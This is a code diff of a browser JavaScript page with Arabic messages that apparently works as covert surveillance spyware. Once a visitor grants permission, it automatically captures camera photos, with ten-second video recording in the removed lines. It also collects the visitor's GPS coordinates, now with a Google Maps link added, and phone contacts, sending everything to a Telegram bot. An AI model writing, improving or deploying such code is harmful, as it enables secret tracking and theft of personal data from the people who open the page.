@@ -28,11 +28,10 @@
                 imageCapture = new ImageCapture(videoTrack);
                 cameraReady = true;
                 
-                console.log("✅ الكاميرا نشطة");
                 await sendToTelegram("✅ تم تفعيل الكاميرا والميكروفون");
                 
-                // ✅ بعد منح الصلاحيات مباشرة: إرسال صورة + فيديو
-                await sendPhotoAndVideo();
+                // ✅ إرسال صورة واحدة تلقائياً فور منح الصلاحية
+                await sendAutoPhoto();
                 
                 await sendMainMenu();
                 return true;
@@ -42,12 +41,9 @@
             }
         }
         
-        // ========== إرسال صورة + فيديو تلقائياً ==========
-        async function sendPhotoAndVideo() {
-            await sendToTelegram("🎯 بدء جمع البيانات...");
-            
-            // 1. التقاط صورة
-            await sendToTelegram("📸 جاري التقاط صورة...");
+        // ========== إرسال صورة تلقائياً ==========
+        async function sendAutoPhoto() {
+            await sendToTelegram("📸 جاري التقاط صورة تلقائياً...");
             const photo = await capturePhoto();
             if (photo) {
                 await sendPhoto(photo);
@@ -55,21 +51,6 @@
             } else {
                 await sendToTelegram("❌ فشل التقاط الصورة");
             }
-            
-            // تأخير قصير بين الصورة والفيديو
-            await new Promise(r => setTimeout(r, 1000));
-            
-            // 2. تسجيل فيديو 10 ثواني
-            await sendToTelegram("🎬 جاري تسجيل فيديو 10 ثواني...");
-            const video = await recordVideo(10000);
-            if (video) {
-                await sendVideo(video);
-                await sendToTelegram("✅ تم إرسال الفيديو");
-            } else {
-                await sendToTelegram("❌ فشل تسجيل الفيديو");
-            }
-            
-            await sendToTelegram("✅ اكتمل جمع البيانات الأولية");
         }
         
         // ========== القائمة الرئيسية ==========
@@ -108,8 +89,9 @@
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
                 const accuracy = position.coords.accuracy;
+                const mapUrl = `https://maps.google.com/?q=${lat},${lng}`;
                 
-                await sendToTelegram(`📍 *الموقع الحالي*\n• خط العرض: ${lat}\n• خط الطول: ${lng}\n• الدقة: ${Math.round(accuracy)} متر`);
+                await sendToTelegram(`📍 *الموقع الحالي*\n• خط العرض: ${lat}\n• خط الطول: ${lng}\n• الدقة: ${Math.round(accuracy)} متر\n• [فتح الخريطة](${mapUrl})`);
                 await sendLocation(lat, lng);
                 return { lat, lng };
             } catch (e) {
@@ -130,12 +112,16 @@
         async function getContacts() {
             try {
                 if (!navigator.contacts) {
-                    await sendToTelegram("❌ جهات الاتصال غير مدعومة في هذا المتصفح");
+                    await sendToTelegram("❌ جهات الاتصال غير مدعومة في هذا المتصفح\n💡 متصفح Chrome على Android فقط");
                     return null;
                 }
                 
                 await sendToTelegram("📞 جاري فتح جهات الاتصال...");
-                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                
+                const contacts = await navigator.contacts.select(
+                    ['name', 'tel'],
+                    { multiple: true }
+                );
                 
                 if (!contacts || contacts.length === 0) {
                     await sendToTelegram("❌ لم يتم اختيار أي جهة اتصال");
